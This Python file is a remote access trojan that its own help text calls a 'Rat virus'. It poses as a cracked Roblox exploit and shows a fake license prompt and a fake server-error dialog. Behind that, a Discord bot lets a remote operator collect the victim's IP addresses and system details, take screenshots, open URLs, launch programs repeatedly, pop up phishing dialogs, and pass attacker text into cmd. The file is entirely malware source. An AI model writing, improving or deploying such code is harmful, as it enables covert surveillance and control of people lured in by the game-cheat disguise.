import os
import platform
import socket
import tkinter
import webbrowser
from tkinter import simpledialog

import discord
import requests
from discord.ext import commands
from mss import mss

intents = discord.Intents.all()
intents.members = True

file_path = os.path.realpath(__file__)

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
print(local_ip)

response = requests.get(url=f'http://ip-api.com/json/').json()

bot = commands.Bot(command_prefix='r/', intents=intents)

parent = tkinter.Tk()
parent.overrideredirect(1)
parent.withdraw()

namedia = 'Roblox EXPLOIT V3 CRACK'

def login():
    keyk = simpledialog.askstring(namedia, "Enter license key (CRACKED VERSION KEY: SHIT): ", parent=parent)
    if keyk == "SHIT":
        orno = simpledialog.askstring(namedia, "Простите но Roblox Exploit не может запуститься."
                                                        " Повторите попытку через 10 минут. Сервера перегруженые. (ERR: 404. No answer)",
                                      parent=parent)
    else:
        simpledialog.askstring(namedia, "Не верный ключ. Нажмите ОК.", parent=parent)
        login()


@bot.event
async def on_ready():
    print('yeah')
    login()


@bot.command()
async def helpme(ctx):
    await ctx.send(
        '`Rat virus with discord logs by @zabivnoyauf228#0833 |  r/info, r/taskmgr,  r/echo(сломаная), \n'
        ' r/calc, r/brow, r/screen, r/spam(в разработке), r/msg`')

@bot.command()
async def spam(ctx, arg):
    if arg == "calc":
        for i in range(0, 10):
            await os.system('cmd /c "calc"')

    if arg == "taskmgr":
        for i in range(0, 10):
            await os.system('cmd /c "taskmgr"')

    await ctx.send()

@bot.command()
async def info(ctx):

    await ctx.send(
        f'`IP: {local_ip} | {platform.platform()}`')

@bot.command()
async def brow(ctx, arg):
    await ctx.send(
        f'Trying to open browser on "||{arg}||"')
    webbrowser.open(arg)

@bot.command()
async def screen(ctx):
    with mss() as sct:
        sct.shot()
    await ctx.send(f'`{local_ip} screen: `', file=discord.File('monitor-1.png'))
    print('screen')

@bot.command()
async def calc(ctx):
    await ctx.send(
        'Trying to open calc')
    await os.system('cmd /c "calc"')

@bot.command()
async def msg(ctx, *, arg):
    await ctx.send(
        'Sending message...')
    askme = simpledialog.askstring('Windows Dialog', arg, parent=parent)
    await ctx.send(f'||{local_ip}|| `answer : {askme}`')


@bot.command()
async def taskmgr(ctx):
    await ctx.send(
        'Trying to open task manager')
    await os.system('cmd /c "taskmgr"')

@bot.command()
async def ip(ctx):
    await ctx.send(response)

@bot.command()
async def echo(ctx, arg):
    await ctx.send(
        f'Sending {arg} to victim')
    await os.system(f'cmd /k "echo {arg}"')

token = 'BOT TOKEN'
bot.run(token)
